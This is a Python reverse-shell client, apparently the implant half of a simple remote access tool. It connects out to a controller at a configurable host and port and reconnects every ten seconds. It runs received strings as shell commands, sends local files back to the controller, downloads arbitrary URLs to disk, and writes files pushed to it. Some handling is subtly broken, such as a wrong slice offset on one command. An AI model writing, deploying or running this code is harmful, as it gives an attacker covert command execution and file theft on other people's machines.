#!/usr/bin/env python3

import os
import sys
import time
import socket
import subprocess as sp
from socket import AF_INET, SOCK_STREAM
from urllib.request import urlopen
from common import pr, Send, Receive

HOST = '127.0.0.1'
PORT = 2000

active = False
sock = None
ret = ''

# ⬆️ ul file
def Upload(sock, file):
  try:
    f = open(file, 'rb')
    d = f.read()
    f.close()
    Send(sock, d + b'FILENAMEXXX%sFILEXXX' % file.encode())
    time.sleep(1)
    return 'File sent 🍺'
  except IOError:
    return 'Error opening file ⚠️'

# TODO: ssl
def Downhttp(sock, url):
  fn = url.split('/')[-1]
  fn = fn.split('?')[0]
  fn = fn.split('#')[0]

  f = open(fn, 'wb')
  f.write(urlopen(url).read())
  f.close()

  return "Download finished 🍺"

def run(s):
  c = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
  out, err = c.communicate()
  out = out.decode('utf-8')
  err = err.decode('utf-8')
  return out + '\n' + err

while True:
  try:
    sock = socket.socket(AF_INET, SOCK_STREAM)
    sock.connect((HOST, PORT))
    if Receive(sock).decode() == 'activate':
      active = True
      Send(sock, os.getcwd() + '>')

    while active:
      data = Receive(sock)

      # server closed
      if not data:
        active = False
        sock.close()
        break

      # ⬇️ dl file
      if data.endswith(b'FILEXXX'):
        data = data[:-7].split(b'FILENAMEXXX')
        d = b''.join(data[:-1])
        fn = data[-1].decode() # to str
        try:
          f = open(fn, 'wb')
          f.write(d)
          f.close()
        except IOError:
          ret = 'Error opening file ⚠️'     
        ret = 'File received 🍺'
        Send(sock, '%s\n%s>' % (ret, os.getcwd()))
        continue
      else:
        data = data.decode()

      if data == 'deactivate':
        active = False
        sock.close()
        break

      elif data.startswith('dl '):
        ret = Upload(sock, data[3:])

      elif data.startswith('dlhttp '):
        ret = Downhttp(sock, data[9:])

      else:
        ret = run(data)

      ret += '\n%s>' % os.getcwd()
      Send(sock, ret)

  except socket.error:
    sock.close()
    time.sleep(10)
    continue
